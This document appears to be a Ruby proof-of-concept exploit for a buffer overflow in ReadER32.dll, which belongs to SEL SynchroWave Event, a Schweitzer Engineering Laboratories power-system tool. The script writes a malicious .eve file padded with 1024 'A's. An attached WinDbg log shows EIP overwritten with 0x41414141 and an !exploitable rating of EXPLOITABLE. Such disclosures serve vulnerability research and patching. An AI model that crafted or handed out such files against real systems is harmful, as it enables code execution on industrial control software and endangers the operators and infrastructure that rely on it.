#!/usr/bin/env ruby
# SEL SynchroWave Event (1.4.1.6) contains a
# buffer overflow in ReadER32.dll (1.8.4.0). 

fd = File.open("template.eve", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

data = "A" * 1024

fuzz = new_eve

x = File.new("fuzz.eve","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
__END__
(d34.bd4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=0000003c ecx=00000001 edx=0573ee33 esi=0573ee34 edi=1005faf0
eip=41414141 esp=0573ed00 ebp=000000ff iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
1:026> dd esp
0573ed00  41414141 41414141 41414141 41414141
0573ed10  41414141 41414141 41414141 41414141
0573ed20  41414141 41414141 41414141 41414141
0573ed30  41414141 41414141 41414141 41414141
0573ed40  41414141 41414141 41414141 41414141
0573ed50  41414141 41414141 41414141 41414141
0573ed60  41414141 41414141 41414141 41414141
0573ed70  41414141 41414141 41414141 41414141
1:026> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0573ecfc 41414141 41414141 41414141 41414141 0x41414141
0573ed00 41414141 41414141 41414141 41414141 0x41414141
0573ed04 41414141 41414141 41414141 41414141 0x41414141
0573ed08 41414141 41414141 41414141 41414141 0x41414141
0573ed0c 41414141 41414141 41414141 41414141 0x41414141
0573ed10 41414141 41414141 41414141 41414141 0x41414141
0573ed14 41414141 41414141 41414141 41414141 0x41414141
0573ed18 41414141 41414141 41414141 41414141 0x41414141
0573ed1c 41414141 41414141 41414141 41414141 0x41414141
0573ed20 41414141 41414141 41414141 41414141 0x41414141
0573ed24 41414141 41414141 41414141 41414141 0x41414141
0573ed28 41414141 41414141 41414141 41414141 0x41414141
0573ed2c 41414141 41414141 41414141 41414141 0x41414141
0573ed30 41414141 41414141 41414141 41414141 0x41414141
0573ed34 41414141 41414141 41414141 41414141 0x41414141
0573ed38 41414141 41414141 41414141 41414141 0x41414141
0573ed3c 41414141 41414141 41414141 41414141 0x41414141
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\SEL\SEL SynchroWAVe Event\ReadER32.dll - 
0573ee3c 10011b5c 1004983c 00000000 00000000 0x41414141
00000000 00000000 00000000 00000000 00000000 ReadER32!SetEmbeddedQuoteCharacter+0x125c
1:026> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0x0000000041414141 called from ReadER32!SetEmbeddedQuoteCharacter+0x000000000000125c (Hash=0x264d5172.0x27445e09)

User mode DEP access violations are exploitable.
1:026> lmvm ReadER32
start    end        module name
10000000 10078000   ReadER32   (export symbols)       C:\Program Files\SEL\SEL SynchroWAVe Event\ReadER32.dll
    Loaded symbol image file: C:\Program Files\SEL\SEL SynchroWAVe Event\ReadER32.dll
    Image path: C:\Program Files\SEL\SEL SynchroWAVe Event\ReadER32.dll
    Image name: ReadER32.dll
    Timestamp:        Tue Oct 08 11:47:47 2013 (52543733)
    CheckSum:         00070767
    ImageSize:        00078000
    File version:     1.8.4.0
    Product version:  1.8.4.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0000.04b0 0409.04b0
    CompanyName:      Schweitzer Engineering Laboratories, Inc.
    ProductName:      Schweitzer Engineering Laboratories, Inc. reader32
    InternalName:     reader32
    OriginalFilename: reader32.dll
    ProductVersion:   1, 8, 4, 0
    FileVersion:      1, 8, 4, 0
    PrivateBuild:     1, 8, 4, 0
    SpecialBuild:     1, 8, 4, 0
    FileDescription:  reader32
    LegalCopyright:   Copyright © 2013
    LegalTrademarks:  Copyright © 2013
    Comments:         Copyright © 2013

